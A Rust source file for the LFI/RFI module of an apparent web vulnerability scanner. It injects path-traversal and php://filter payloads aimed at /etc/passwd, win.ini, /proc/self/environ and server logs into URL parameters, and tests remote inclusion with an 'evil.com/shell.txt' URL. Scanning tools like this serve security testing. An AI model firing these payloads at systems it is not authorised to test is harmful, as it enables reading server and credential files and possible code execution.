use async_trait::async_trait;
use regex::Regex;
use std::path::{Path, PathBuf};
use crate::scanners::traits::VulnerabilityScanner;
use crate::core::crawler::CrawledPage;
use crate::reporting::models::Vulnerability;
use crate::error::VenomResult;

pub struct LfiScanner {
    payloads_path: PathBuf,
}

impl LfiScanner {
    pub fn new(payloads_path: &Path) -> Self {
        Self { payloads_path: payloads_path.to_path_buf() }
    }

    fn load_payloads(&self) -> Vec<String> {
        if let Ok(content) = std::fs::read_to_string(&self.payloads_path) {
            content.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty() && !l.starts_with('#')).collect()
        } else {
            default_lfi_payloads()
        }
    }
}

#[async_trait]
impl VulnerabilityScanner for LfiScanner {
    fn name(&self) -> &str { "LFI/RFI Scanner" }
    fn description(&self) -> &str { "Tests for Local/Remote File Inclusion vulnerabilities" }

    async fn scan(
        &self,
        pages: &[CrawledPage],
        client: &reqwest::Client,
    ) -> VenomResult<Vec<Vulnerability>> {
        let mut vulns = Vec::new();
        let payloads = self.load_payloads();

        let lfi_indicators = vec![
            Regex::new(r"root:.*:0:0:").unwrap(),
            Regex::new(r"$$boot loader$$").unwrap(),
            Regex::new(r"$$extensions$$").unwrap(),
            Regex::new(r";\s*for 16-bit app support").unwrap(),
            Regex::new(r"<\?php").unwrap(),
            Regex::new(r"<?xml version").unwrap(),
            Regex::new(r"$$mysqld$$").unwrap(),
            Regex::new(r"DocumentRoot").unwrap(),
            Regex::new(r"ServerRoot").unwrap(),
        ];

        let file_params = vec!["file", "path", "page", "include", "doc", "document",
            "folder", "root", "pg", "style", "pdf", "template", "php_path",
            "name", "cat", "dir", "action", "board", "date", "detail",
            "download", "prefix", "content", "layout", "mod", "conf"];

        for page in pages {
            for (param_name, _) in &page.params {
                let param_lower = param_name.to_lowercase();
                let is_file_param = file_params.iter().any(|p| param_lower.contains(p));

                if !is_file_param {
                    continue;
                }

                // Get baseline response
                let baseline_len = if let Ok(resp) = client.get(&page.url).send().await {
                    resp.text().await.unwrap_or_default().len()
                } else {
                    0
                };

                for payload in &payloads {
                    let test_url = inject_param(&page.url, param_name, payload);

                    if let Ok(resp) = client.get(&test_url).send().await {
                        if let Ok(body) = resp.text().await {
                            // Check for LFI indicators
                            for indicator in &lfi_indicators {
                                if indicator.is_match(&body) {
                                    let severity = if payload.contains("etc/passwd") || payload.contains("win.ini") {
                                        "CRITICAL"
                                    } else {
                                        "HIGH"
                                    };

                                    vulns.push(create_lfi_vuln(
                                        &page.url, param_name, payload,
                                        &format!("File content detected: {}", indicator.as_str()),
                                        severity,
                                    ));
                                    break;
                                }
                            }

                            // Check for significant response size difference (potential file content)
                            if body.len() > baseline_len + 500 && !body.contains("404") && !body.contains("not found") {
                                // Potential LFI but lower confidence
                                log::debug!("Potential LFI at {} param {} with payload {}", page.url, param_name, payload);
                            }
                        }
                    }
                }

                // RFI test - try including a known URL
                let rfi_payloads = vec![
                    "http://evil.com/shell.txt",
                    "https://raw.githubusercontent.com/test/test/main/test.txt",
                ];

                for payload in &rfi_payloads {
                    let test_url = inject_param(&page.url, param_name, payload);
                    if let Ok(resp) = client.get(&test_url).send().await {
                        if let Ok(body) = resp.text().await {
                            // If the response includes content from the remote URL
                            if body.contains("evil.com") || body.len() > baseline_len + 200 {
                                vulns.push(create_rfi_vuln(
                                    &page.url, param_name, payload,
                                    "Remote file content may have been included",
                                ));
                            }
                        }
                    }
                }
            }
        }

        Ok(vulns)
    }
}

fn inject_param(url: &str, param: &str, payload: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let pairs: Vec<(String, String)> = parsed.query_pairs()
            .map(|(k, v)| {
                if k == param { (k.to_string(), payload.to_string()) }
                else { (k.to_string(), v.to_string()) }
            }).collect();
        parsed.query_pairs_mut().clear();
        for (k, v) in pairs { parsed.query_pairs_mut().append_pair(&k, &v); }
        parsed.to_string()
    } else { url.to_string() }
}

fn create_lfi_vuln(url: &str, param: &str, payload: &str, evidence: &str, severity: &str) -> Vulnerability {
    let mut vuln = Vulnerability::new("Local File Inclusion (LFI)", "LFI", severity, url);
    vuln.parameter = Some(param.to_string());
    vuln.payload = Some(payload.to_string());
    vuln.evidence = evidence.to_string();
    vuln.description = format!(
        "A Local File Inclusion vulnerability was found in the '{}' parameter. \
         The application includes local files based on user input without proper validation.", param
    );
    vuln.impact = "An attacker can read sensitive files from the server including configuration \
         files, source code, /etc/passwd, and potentially achieve Remote Code Execution \
         via log poisoning or PHP wrappers.".to_string();
    vuln.remediation = "1. Never use user input directly in file inclusion functions\n\
         2. Use a whitelist of allowed files\n\
         3. Implement proper input validation\n\
         4. Disable allow_url_include in PHP\n\
         5. Use chroot jails or containerization".to_string();
    vuln.cwe_id = Some("CWE-98".to_string());
    vuln.references = vec![
        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion".to_string(),
    ];
    vuln
}

fn create_rfi_vuln(url: &str, param: &str, payload: &str, evidence: &str) -> Vulnerability {
    let mut vuln = Vulnerability::new("Remote File Inclusion (RFI)", "RFI", "CRITICAL", url);
    vuln.parameter = Some(param.to_string());
    vuln.payload = Some(payload.to_string());
    vuln.evidence = evidence.to_string();
    vuln.description = format!(
        "A Remote File Inclusion vulnerability was found in the '{}' parameter. \
         The application includes remote files from attacker-controlled servers.", param
    );
    vuln.impact = "An attacker can execute arbitrary code on the server by including a \
         malicious remote file, leading to full system compromise.".to_string();
    vuln.remediation = "1. Disable allow_url_include and allow_url_fopen in PHP\n\
         2. Use strict input validation with whitelists\n\
         3. Implement proper access controls\n\
         4. Use a Web Application Firewall".to_string();
    vuln.cwe_id = Some("CWE-98".to_string());
    vuln
}

fn default_lfi_payloads() -> Vec<String> {
    vec![
        "../../../../etc/passwd", "../../../etc/passwd", "../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini", "....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd", "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "....//....//....//....//etc/passwd",
        "/etc/passwd", "C:\\Windows\\win.ini",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "/proc/self/environ", "/var/log/apache2/access.log",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/%00/etc/passwd",
    ].iter().map(|s| s.to_string()).collect()
}